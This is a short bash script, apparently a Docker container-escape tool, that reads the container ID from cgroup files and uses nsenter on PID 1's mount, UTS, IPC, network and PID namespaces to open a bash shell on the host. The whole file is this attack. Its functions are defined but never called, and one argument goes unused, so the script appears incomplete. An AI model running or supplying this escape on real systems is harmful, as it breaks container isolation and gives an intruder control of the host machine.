# docker_escape.sh

LOG_FILE="escape_docker.log"

setup_logging() {
    touch "$LOG_FILE"
    exec 3>>"$LOG_FILE"
    exec 4>&1
}

get_container_id() {
    methods=('/proc/1/cgroup' '/proc/self/cgroup')
    for method in "${methods[@]}"; do
        container_id=$(try_get_container_id "$method")
        [ -n "$container_id" ] && echo "$container_id" && return 0
    done
    return 1
}

try_get_container_id() {
    method="$1"
    if [ -e "$method" ]; then
        container_id=$(awk -F/ '/docker|kubepods/ {print $NF}' "$method")
        [ -n "$container_id" ] && echo "$container_id" && return 0
    fi
    return 1
}

escape_from_container() {
    container_id="$1"
    nsenter --target 1 --mount --uts --ipc --net --pid -- bash
    return $?
}

log_info() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') [INFO]: $1" >&3
}

log_error() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') [ERROR]: $1" >&3
}
